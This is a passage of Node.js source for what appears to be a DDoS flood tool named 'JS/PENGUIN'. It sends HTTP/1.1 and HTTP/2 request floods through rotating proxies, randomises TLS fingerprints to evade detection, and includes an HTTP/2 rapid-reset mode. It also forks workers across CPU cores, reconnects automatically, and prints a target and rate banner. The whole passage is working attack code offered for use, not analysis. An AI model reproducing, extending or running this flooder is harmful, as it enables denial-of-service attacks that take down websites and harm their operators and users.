                ALPNProtocols: http_opt === 1 ? ['http/1.1'] : http_opt === 2 ? ['h2'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: shuffled_ciphers.join(':'),
                ...(Math.random() < 0.50 ? { sigalgs: shuffled_sigalgs.join(':') } : {}),
                ecdhCurve: shuffled_curves.join(':'),
                dhparam: 'auto',
                minVersion: versions[~~Math.floor[Math.random() * versions.length]],
                requestOCSP: true,
                rejectUnauthorized: false,
                honorCipherOrder: false,
                session: crypto.randomBytes(64),
                compression: true,
                ...(fingerprint_opt === true ? { fingerprint: random_fingerprint() } : {}),
            }, async () => {
                tls_conn.addListener("ratelimit", async (duration) => {
                    const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
                    const index = proxies.indexOf(proxyKey);
                    if (index > -1) proxies.splice(index, 1);
                    tls_conn.end(() => tls_conn.destroy());
                    await timeout((duration * 1000) + 1000 * Math.random());
                });
                if (tls_conn.alpnProtocol != 'h2') {
                    tls_conn.on('data', (data) => {
                        const response = data.toString('utf8');
                        const status_regex = response.match(/HTTP\/1\.1 (\d{3})/);

                        if (status_regex) {
                            const status = parseInt(status_regex[1]);
                            status_codes[status] = (status_codes[status] || 0) + 1;

                            if (status == 429 && ratelimit_opt) {
                                tls_conn.emit('ratelimit', 10);
                            }
                        }
                    });

                    const sendHTTP1 = () => {
                        requestGenerateHeaders(request);
                        const headers = requestBuildStr(request);
                        tls_conn.write(headers, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    sendHTTP1()
                                }, slowmo ? 1000 : (1000 + (Math.random() * 10)) / ratelimit)
                            } else {
                                tls_conn.end(() => tls_conn.destroy());
                            }
                        })
                    };

                    sendHTTP1();
                }

                if (http_opt === 1) tls_conn.end(() => tls_conn.destroy());

                var http2 = createHttp2Object(host);
                let streamId = http2.id;

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);

                http2.frames.push(Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'))

                const settings_frame = http2EncodeFrame(http2, 0, 0x4, http2EncodeSettings([
                    [SettingHeaderTableSize, 65536],
                    [SettingEnablePush, 0],
                    [SettingInitialWindowSize, 6291456],
                    [SettingMaxHeaderListSize, 262144],
                ]));

                http2.frames.push(settings_frame);
                const update_window_frame = http2EncodeFrame(http2, 0, 0x8, updateWindow);
                http2.frames.push(update_window_frame);

                tls_conn.on('data', async (response) => {
                    http2.data = Buffer.concat([http2.data, response]);
                        while (http2.data.length >= 9) {
                            const frame = http2DecodeFrame(http2.data);
                            if (frame != null) {
                                http2.data = http2.data.subarray(frame.length + 9);
                                if (frame.type === 0) {
                                    if (test) {
                                        console.log(`${frame.payload.toString('utf-8')}`);
                                    }
                                } else if (frame.type === 1) {
                                    const headers = http2.hpack.decode(frame.payload);
                                    const statusHeader = headers.find(header => header[0] === ':status');
                                    const cookieHeader = headers.find(header => header[0].toLowerCase() === 'set-cookie');
                                    const redirectHeader = headers.find(header => header[0] === 'location');
                        
                                    if (statusHeader) {
                                        const status_code = statusHeader[1];
                                   
                                        status_codes[status_code] = (status_codes[status_code] || 0) + 1;
                                        if (status_code === "429" && ratelimit_opt) {
                                            const ratelimit_duration = headers.find(header => header[0] === 'retry-after');
                                            tls_conn.emit("ratelimit", (parseInt(ratelimit_duration[1])));
                                        }

                                        if (['403', '400', '429'].includes(status_code) && close_opt) {
                                            tls_conn.end(() => tls_conn.destroy());
                                        }
                                    }

                                    if (cookieHeader && cookieHeader[1]) {
                                        const set_cookie = cookieHeader[1];
                                        const current_cookies = requestFindHeader(request, 'cookie');
                                        if (current_cookies) {
                                            requestReplaceHeader(request, 'cookie', `${current_cookies}, ${set_cookie}`)
                                        } else {
                                            requestAddHeader(request, 'cookie', set_cookie);
                                        }
                                    }

                                    if (redirectHeader && redirectHeader[1]) {
                                        const redirect_url = new URL(redirectHeader[1], url.href);
                                        const redirect = {
                                            host: redirect_url.host,
                                            path: redirect_url.pathname,
                                            href: redirect_url.href,
                                        }

                                        if (redirect.host && redirect.host !== url.host) requestReplaceHeader(request, ":authority", redirect.host);
                                        if (redirect.path) {
                                            requestSetPath(request, redirect.path);
                                            requestReplaceHeader(request, ":path", redirect.path);
                                        }
                                    }
                                } else if (frame.type == 4 && frame.flags == 0) {
                                    tls_conn.write(http2EncodeFrame(http2, 0, 0x4, "", 0x1));
                                } else if (frame.type === 7) {
                                    tls_conn.end(() => tls_conn.destroy());
                                }
                            } else {
                                break;
                            }
                    }
                });

                tls_conn.write(Buffer.concat(http2.frames));
                const reset_types = [0x7, 0x8];

                const sendHTTP2 = () => {
                    var rate = process_rate() || ratelimit;

                    if (tls_conn.destroyed || socket.destroyed) start(host, port, proto, options);

                    const queue = [];

                    for (var x = 0; x < ratelimit; x++) {
                        requestGenerateHeaders(request)

                        const packed_headers = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            http2.hpack.encode(request.headers)
                        ]);
        
                        queue.push(http2EncodeFrame(http2, streamId, 0x1, packed_headers, 0x1 | 0x4 | 0x20));
                        if (rapidreset && http2.id >= rate) {
                            queue.push(http2EncodeRstStream(streamId, reset_types[~~Math.random(Math.floor() * reset_types.length)], 0x0));
                        }

                        const data_buffer = data_opt !== undefined ? (data_opt === "RAND" ? Buffer.from(random_string(random_int(10, 100)), 'utf-8') : Buffer.from(data_opt, 'utf-8')) : null;
                        if (data_buffer) queue.push([http2EncodeFrame(http2, streamId, 0x0, data_buffer, 0x0)])
            
                        streamId += 2;
                        http2.id += 2;
                    }

                    tls_conn.write(Buffer.concat(queue), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                sendHTTP2();
                            }, slowmo ? 1000 : (1000 + (Math.random() * 10)) / rate);
                        }
                    });      
                }
                sendHTTP2();
            }).once('close', () => {
                tls_conn.removeAllListeners();
                proxyClose(proxy);
                start(host, port, proto, options);
            }).once('error', (err) => {
                tls_conn.removeAllListeners();
                proxyClose(proxy);
                start(host, port, proto, options);
            }).once('end', () => {
                tls_conn.removeAllListeners();
                proxyClose(proxy);
                start(host, port, proto, options);
            });
        }).catch((err) => {
            if (checker) {
                const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
                const index = proxies.indexOf(proxyKey);
                if (index > -1) proxies.splice(index, 1);
            }
            proxyClose(proxy);
            start(host, port, proto, options);
        })
}

if (cluster.isMaster) {
    const workers = {};

    for (var thread = 0; thread < threads; thread++) {
        cluster.fork({
            core: thread % os.cpus().length
        });
    }
    
    if (ip_opt === undefined) {
        console.log(`
        ———   ${'Method'.bold}${':'.red.bold}    [ ${'HTTP'.bold}${reqmethod.bold} ]
        ———   ${'Target'.bold}${':'.red.bold}    [ ${target.bold.underline} ]
        ———   ${'Time'.bold}${':'.red.bold}      [ ${`${time}`.bold} ${'seconds'.bold} ]
        ———   ${'Threads'.bold}${':'.red.bold}   [ ${`${threads} cores`.bold} ]
        ———   ${'Rate'.bold}${':'.red.bold}      [ ${`${ratelimit} rq/s`.bold} ]
        ———   ${'Debug'.bold}${':'.red.bold}     [ ${debug === "true" ? 'true'.green.bold : debug === "false" ? 'false'.red.bold : Boolean(debug) ? 'true'.green.bold : 'false'.red.bold} ]
        `);
    }

    cluster.on('exit', (worker, code, signal) => {
        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
            cluster.fork({ core: worker.id % os.cpus().length });
        }
    });

    cluster.on("message", (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (Boolean(debug) && debug !== "false") {
        var count = 1;
        setInterval(() => {
            let status_codes = {};
            let worker_count = 0;
            for (let w in workers) {
                if (workers[w][0].state === "online") {
                    worker_count++;
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (!status_codes[code]) status_codes[code] = 0;
                            status_codes[code] += st[code];
                        }
                    }
                }
            }
            const statusses = Object.entries(status_codes)
                .map(([status, value]) => {
                    var color_status;
                    if (status < 500 && status >= 400 && status !== 404) {
                        color_status = status.toString().red.bold;
                    } else if (status >= 300 && status < 400) {
                        color_status = status.toString().yellow.bold;
                    } else {
                        color_status = status.toString().green.bold;
                    }
                    return `${color_status}: ${colors.underline(value)}`;
                })
                .join(', ');

            console.log(`   [${'JS/PENGUIN'.magenta.bold}] | ${colors.bold('Time')}: [${colors.underline(time-count)}], ${colors.bold('Status')}: [${statusses}]`);
            count++;
        }, 1000);
    }
} else {
    let conns = 1;
    let delay = delay_opt ? delay_opt : 5;
    let proxy_protocol = proxytype.toUpperCase();

    let active_conns = 0;

    for (var x = 0; x < conns; x++) {
        const flood_interval = setInterval(() => {
            if (ip_opt) {
                const parsed = parseProxyLine(ip_opt);
                start(parsed.proxy_host, Number(parsed.proxy_port), parsed.proxy_proto, { 
                    username: parsed.proxy_user, 
                    password: parsed.proxy_pass 
                });
                active_conns++;
            } else {
                if (!proxies || proxies.length === 0) {
                    return;
                }
                var proxy_line = proxies[~~Math.floor(Math.random() * proxies.length)];
                if (!proxy_line || proxy_line.trim() === '') {
                    return;
                }
                const parsed = parseProxyLine(proxy_line);
                if (connections !== undefined && connections <= active_conns) {
                    clearInterval(flood_interval);
                    return;
                }
                if (parsed.proxy_host && parsed.proxy_port) {
                    start(parsed.proxy_host, Number(parsed.proxy_port), parsed.proxy_proto, { 
                        username: parsed.proxy_user, 
                        password: parsed.proxy_pass 
                    });
                    active_conns++;
                }
            }
        }, delay);
    }

    if (Boolean(debug) && debug !== "false") {
        setInterval(() => {
            if (status_queue.length >= 4) status_queue.shift();
            status_queue.push(status_codes);
            status_codes = {};
            try {
                if (process.connected) {
                    process.send(status_queue);
                }
            } catch (err) {
                console.log(err);
            }
        }, 250);
    }
}

const exit = () => process.exit(1);
setTimeout(exit, time * 1000);
